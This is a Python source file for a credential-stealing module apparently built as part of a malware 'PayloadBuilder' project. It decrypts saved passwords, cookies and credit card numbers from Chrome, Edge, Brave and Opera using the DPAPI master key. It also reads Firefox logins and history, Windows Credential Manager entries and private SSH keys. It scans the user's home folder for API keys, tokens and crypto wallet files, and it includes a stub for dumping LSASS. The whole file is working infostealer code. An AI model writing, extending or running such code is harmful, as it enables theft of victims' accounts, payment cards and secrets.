#~/Desktop/Chimera/PayloadBuilder/modules/credential_collector.py
"""
Authentication & Credentials Collector
- Browsers(passwords, cookies, history, autofill)
- Windows Credential Manager
- LSASS minidump (placeholder)
- SSH keys, API keys, crypto wallets
"""
import os
import sqlite3
import shutil
import json
import base64
import re
import subprocess
from Crypto.Cipher import AES
import win32crypt


class CredentialCollector:
    @staticmethod
    def collect():
        data = {}
        data['browsers'] = CredentialCollector._collect_browsers()
        data['credential_manager'] = CredentialCollector._get_credential_manager()
        data['lsass'] = CredentialCollector._dump_lsass()
        data['ssh_keys'] = CredentialCollector._get_ssh_keys()
        data['api_keys'] = CredentialCollector._get_api_keys()
        data['crypto_wallets'] = CredentialCollector._get_crypto_wallets()
        return data

    # ---- Browser Collection ----
    @staticmethod
    def _collect_browsers():
        browsers = []
        chromium_paths = [
            {"name": "Chrome", "path": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")},
            {"name": "Edge", "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data")},
            {"name": "Edge Beta", "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge Beta\\User Data")},
            {"name": "Edge Dev", "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge Dev\\User Data")},
            {"name": "Edge Canary", "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge SxS\\User Data")},
            {"name": "Opera", "path": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable")},
            {"name": "Brave", "path": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")}
        ]
        for browser in chromium_paths:
            if os.path.exists(browser["path"]):
                print(f"[DEBUG] Found browser path: {browser['name']} at {browser['path']}")
                data = CredentialCollector._collect_chromium_browser(browser["name"], browser["path"])
                if data:
                    browsers.append(data)
                else:
                    print(f"[DEBUG] Failed to collect data for {browser['name']}")

        # Firefox
        firefox_data = CredentialCollector._collect_firefox()
        if firefox_data:
            browsers.append(firefox_data)
        return browsers

    @staticmethod
    def _collect_chromium_browser(name, user_data_path):
        data = {"name": name, "passwords": [], "cookies": [], "history": [], "autofill": []}
        local_state_path = os.path.join(user_data_path, "Local State")
        if not os.path.exists(local_state_path):
            print(f"[!] Local State not found for {name}")
            return None

        # ---- Master Key (for v10/v11 decryption) ----
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # remove 'DPAPI'
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            print(f"[✓] Master key extracted for {name} (length: {len(master_key)})")
        except Exception as e:
            print(f"[✗] Master key FAILED for {name}: {e}")
            return None

        # ---- Nested read_db (for DB-based extraction) ----
        def read_db(db_path, query, fetch_one=False):
            if not os.path.exists(db_path):
                print(f"    [DB] File missing: {db_path}")
                return [] if not fetch_one else None
            try:
                size = os.path.getsize(db_path)
                print(f"    [DB] {os.path.basename(db_path)} size: {size} bytes")
            except: pass

            temp_path = None
            for attempt in range(3):
                try:
                    temp_path = os.path.join(os.environ['TEMP'], f"{name}_{os.path.basename(db_path)}_{attempt}.db")
                    shutil.copy2(db_path, temp_path)
                    conn = sqlite3.connect(temp_path, timeout=30)
                    cursor = conn.cursor()
                    cursor.execute(query)
                    result = cursor.fetchone() if fetch_one else cursor.fetchall()
                    conn.close()
                    os.remove(temp_path)
                    print(f"    [DB] Read OK via copy: {len(result) if result else 0} rows")
                    return result
                except (PermissionError, OSError, sqlite3.OperationalError) as e:
                    print(f"    [DB] Copy attempt {attempt} failed: {e}")
                    if temp_path and os.path.exists(temp_path):
                        try: os.remove(temp_path)
                        except: pass
                    break
                except Exception as e:
                    print(f"    [DB] Copy attempt {attempt} error: {e}")
                    break

            try:
                conn = sqlite3.connect(f"file:{db_path}?mode=ro&nolock=1", uri=True, timeout=30)
                cursor = conn.cursor()
                cursor.execute(query)
                result = cursor.fetchone() if fetch_one else cursor.fetchall()
                conn.close()
                print(f"    [DB] Read OK via direct: {len(result) if result else 0} rows")
                return result
            except Exception as e:
                print(f"    [DB] Direct read FAILED for {db_path}: {e}")
                return [] if not fetch_one else None

        # ---- Try to extract ALL cookies using browser_cookie3 (supports v20) ----
        cookie_extracted_with_lib = False
        try:
            import browser_cookie3   # Optional import – falls back if missing
            loaders = {
                "edge": browser_cookie3.edge,
                "chrome": browser_cookie3.chrome,
                "brave": browser_cookie3.brave,
                "opera": browser_cookie3.opera,
                "opera stable": browser_cookie3.opera,
            }
            loader = loaders.get(name.lower())
            if loader:
                cj = loader(domain_name='')  # all domains
                if cj:
                    for cookie in cj:
                        data['cookies'].append({
                            "domain": cookie.domain,
                            "name": cookie.name,
                            "value": cookie.value,
                            "path": cookie.path
                        })
                    print(f"    [COOKIE] Extracted {len(data['cookies'])} cookies via browser_cookie3")
                    cookie_extracted_with_lib = True
                else:
                    print("    [COOKIE] browser_cookie3 returned empty jar")
            else:
                print(f"    [COOKIE] No loader for {name}")
        except ImportError:
            print("    [COOKIE] browser_cookie3 not installed – will use DB method")
        except Exception as e:
            print(f"    [COOKIE] browser_cookie3 error: {e} – falling back to DB method")

        # ---- Profiles ----
        profiles = ['Default']
        for i in range(1, 10):
            if os.path.exists(os.path.join(user_data_path, f"Profile {i}")):
                profiles.append(f"Profile {i}")
        print(f"[DEBUG] Profiles found for {name}: {profiles}")

        for profile in profiles:
            profile_path = os.path.join(user_data_path, profile)
            print(f"[DEBUG] Scanning profile: {profile}")

            # ---- PASSWORDS (v10/v11 works, v20 will fail with placeholder) ----
            login_db = os.path.join(profile_path, "Login Data")
            rows = read_db(login_db, "SELECT origin_url, username_value, password_value FROM logins")
            if rows:
                for row in rows:
                    url, username, enc_pass = row
                    if enc_pass:
                        try:
                            if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                                nonce = enc_pass[3:15]
                                ciphertext = enc_pass[15:-16]
                                tag = enc_pass[-16:]
                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                                password = decrypted.decode('utf-8')
                            elif enc_pass.startswith(b'v20'):
                                # This will likely fail – you need full v20 implementation
                                password = CredentialCollector._decrypt_v20(enc_pass, local_state_path)
                            else:
                                password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8')
                            if password:
                                data['passwords'].append({"url": url, "username": username, "password": password})
                        except Exception as e:
                            print(f"    [PWD] Decrypt failed for {url}: {e}")
                            continue

            # ---- COOKIES (DB method – only if library didn't extract them) ----
            if not cookie_extracted_with_lib:
                cookie_db = os.path.join(profile_path, "Network", "Cookies")
                if not os.path.exists(cookie_db):
                    cookie_db = os.path.join(profile_path, "Cookies")
                rows = read_db(cookie_db, "SELECT host_key, name, encrypted_value, path FROM cookies LIMIT 200")
                if rows:
                    for row in rows:
                        host, cname, enc_val, path = row
                        if enc_val:
                            try:
                                if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
                                    nonce = enc_val[3:15]
                                    ciphertext = enc_val[15:-16]
                                    tag = enc_val[-16:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                                    value = decrypted.decode('utf-8')
                                elif enc_val.startswith(b'v20'):
                                    value = CredentialCollector._decrypt_v20(enc_val, local_state_path)
                                else:
                                    value = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8')
                                if value:
                                    data['cookies'].append({"domain": host, "name": cname, "value": value, "path": path})
                            except Exception as e:
                                print(f"    [COOKIE] Decrypt failed for {host}: {e}")
                                continue

            # ---- HISTORY (unencrypted) ----
            history_db = os.path.join(profile_path, "History")
            rows = read_db(history_db, "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            if rows:
                for row in rows:
                    data['history'].append({"url": row[0], "title": row[1], "timestamp": row[2]})

            # ---- AUTOFILL (credit cards) ----
            webdata_db = os.path.join(profile_path, "Web Data")
            rows = read_db(webdata_db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            if rows:
                for row in rows:
                    card_name, exp_m, exp_y, enc = row
                    if enc:
                        try:
                            if enc.startswith(b'v10') or enc.startswith(b'v11'):
                                nonce = enc[3:15]
                                ciphertext = enc[15:-16]
                                tag = enc[-16:]
                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                                number = decrypted.decode('utf-8')
                            elif enc.startswith(b'v20'):
                                number = CredentialCollector._decrypt_v20(enc, local_state_path)
                            else:
                                number = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8')
                            if number:
                                data['autofill'].append({"type": "credit_card", "name": card_name, "expiry": f"{exp_m}/{exp_y}", "number": number})
                        except Exception as e:
                            print(f"    [CC] Decrypt failed: {e}")
                            continue

        print(f"[✓] Finished {name}: {len(data['passwords'])} passwords, {len(data['cookies'])} cookies, {len(data['history'])} history entries")
        return data

    @staticmethod
    def _decrypt_v20(encrypted_data, local_state_path):
        """
        Attempt to decrypt v20 encrypted data (passwords/cookies).
        This is a PLACEHOLDER – real v20 decryption requires SYSTEM DPAPI.
        For now, it falls back to plain DPAPI (which works for some older data).
        """
        try:
            print("    [WARN] v20 decryption not fully implemented – trying fallback DPAPI")
            return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1].decode('utf-8')
        except Exception as e:
            print(f"    [v20] Fallback failed: {e}")
            return None

    @staticmethod
    def _collect_firefox():
        """Extract Firefox logins, cookies, and history (simplified)"""
        data = {"name": "Firefox", "passwords": [], "cookies": [], "history": []}
        profiles_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        if not os.path.exists(profiles_path):
            return None

        firefox_paths = []
        for folder in os.listdir(profiles_path):
            if folder.endswith('.default-release') or folder.endswith('.default'):
                firefox_paths.append(os.path.join(profiles_path, folder))

        for profile_path in firefox_paths:
            # logins.json (encrypted – we just read the raw blobs)
            logins_json = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_json):
                try:
                    with open(logins_json, 'r', encoding='utf-8') as f:
                        logins = json.load(f)
                    for entry in logins.get('logins', []):
                        data['passwords'].append({
                            "url": entry.get('hostname', ''),
                            "username": entry.get('encryptedUsername', ''),
                            "password": entry.get('encryptedPassword', '')
                        })
                except:
                    pass

            # history from places.sqlite
            places_db = os.path.join(profile_path, "places.sqlite")
            if os.path.exists(places_db):
                try:
                    conn = sqlite3.connect(places_db, timeout=10)
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_date FROM moz_places ORDER BY visit_date DESC LIMIT 100")
                    rows = cursor.fetchall()
                    for row in rows:
                        data['history'].append({"url": row[0], "title": row[1], "timestamp": row[2]})
                    conn.close()
                except:
                    pass

        return data if data['passwords'] or data['history'] else None

    # ---- Credential Manager ----
    @staticmethod
    def _get_credential_manager():
        entries = []
        try:
            output = subprocess.check_output('vaultcmd /listcreds:', shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in output.splitlines():
                if ':' in line and 'Credential' in line:
                    parts = line.split(':')
                    if len(parts) >= 2:
                        entries.append({"resource": parts[0].strip(), "username": parts[1].strip()})
        except:
            pass
        return entries

    # ---- LSASS (placeholder) ----
    @staticmethod
    def _dump_lsass():
        return {"status": "not attempted", "note": "Requires admin and SeDebugPrivilege"}

    # ---- SSH Keys ----
    @staticmethod
    def _get_ssh_keys():
        keys = []
        ssh_dir = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_dir):
            for file in os.listdir(ssh_dir):
                if file.endswith('_rsa') or file.endswith('_ed25519') or file in ['id_rsa', 'id_ed25519']:
                    path = os.path.join(ssh_dir, file)
                    try:
                        with open(path, 'r') as f:
                            content = f.read()
                        keys.append({"path": path, "content": content})
                    except:
                        continue
        return keys

    # ---- API Keys ----
    @staticmethod
    def _get_api_keys():
        api_keys = []
        targets = ['config.json', 'settings.py', '.env', 'credentials.ini']
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            if 'AppData' in root or 'Program Files' in root:
                continue
            for file in files:
                if file.lower() in targets:
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        matches = re.findall(r'(api[_-]?key|secret|token)\s*[:=]\s*["\']?([^"\'\n]+)["\']?', content, re.IGNORECASE)
                        for m in matches:
                            api_keys.append({"file": path, "key": m[0], "value": m[1]})
                    except:
                        continue
        return api_keys

    # ---- Crypto Wallets ----
    @staticmethod
    def _get_crypto_wallets():
        wallets = []
        wallet_files = ['wallet.dat', 'bitcoin.dat', 'litecoin.dat', 'keyfile', 'seed.txt']
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if file.lower() in wallet_files:
                    path = os.path.join(root, file)
                    try:
                        size = os.path.getsize(path)
                        wallets.append({"path": path, "size_bytes": size})
                    except:
                        continue
        return wallets
